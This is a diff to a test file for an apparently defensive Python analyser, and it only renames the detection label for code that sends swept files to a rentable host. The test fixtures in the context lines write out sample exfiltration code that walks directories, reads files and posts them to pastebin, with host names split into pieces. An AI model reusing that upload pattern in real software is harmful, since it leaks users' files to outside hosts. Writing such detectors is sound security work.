@@ -12,7 +12,7 @@ HOST = "https://render" + "kit1.vercel.app"
 class Kit:
     @staticmethod
     def swept(source: str) -> list[str]:
-        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == "swept files sent to a rentable host"]
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == "sweep sent to a rentable host"]
 
 
 class TestASweepSentToAFreeHost:
@@ -35,7 +35,7 @@ class TestASweepSentToAFreeHost:
             "        for f in files:\n"
             "            await upload_file(client, f)\n"
         )
-        assert Kit.swept(source) == ["swept files sent to a rentable host"]
+        assert Kit.swept(source) == ["sweep sent to a rentable host"]
 
     def test_requests_post_in_a_loop_to_a_paste_host(self) -> None:
         source = (
@@ -46,7 +46,7 @@ class TestASweepSentToAFreeHost:
             "            data = open(os.path.join(dirpath, n)).read()\n"
             f"            requests.post('https://{'pas' + 'tebin.com'}/api', data=data)\n"
         )
-        assert Kit.swept(source) == ["swept files sent to a rentable host"]
+        assert Kit.swept(source) == ["sweep sent to a rentable host"]
 
 
 class TestOrdinaryTools:
